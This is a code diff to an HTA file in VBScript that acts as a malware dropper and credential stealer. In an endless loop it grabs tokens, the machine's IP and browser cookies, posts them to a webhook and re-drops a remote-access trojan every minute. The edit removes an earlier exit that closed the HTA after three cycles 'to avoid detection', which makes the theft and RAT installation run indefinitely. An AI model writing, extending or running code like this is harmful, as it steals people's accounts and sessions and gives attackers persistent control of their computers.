@@ -30,21 +30,21 @@ Call Persistence
 Call DropRAT(WH, True)
 Call DropRAT(RE_WH, False)
 
-' --- 4. INTERACTIVE LOOP (Keep HTA alive to process initial commands, then let the dropped RAT take over) ---
+' --- 4. INTERACTIVE LOOP (Re Grab N, forever, re-drops RAT every cycle) ---
 Dim runCount
 runCount = 0
 Do
     runCount = runCount + 1
-    Call PostEmbedTo(":repeat: Stage 1 Heartbeat", "PC: " & PC & " | Cycle: " & runCount, 10181046, RE_WH)
+    Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
     
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
     Call PostCookieOnly(RE_WH)
     
-    Call SleepSeconds(60)
+    ' Re-drop the RAT every cycle so a failed launch is retried
+    Call DropRAT(WH, True)
     
-    ' After 3 cycles, the dropped RAT should be active. We close the HTA to avoid detection.
-    If runCount >= 3 Then Exit Do
+    Call SleepSeconds(60)
 Loop
 
 window.close()
@@ -378,4 +378,4 @@ Function Ej(s)
     Ej = Replace(Ej, vbTab, Chr(92) & "t")
 End Function
 </script>
-</head><body></body></html>
+</body></html>
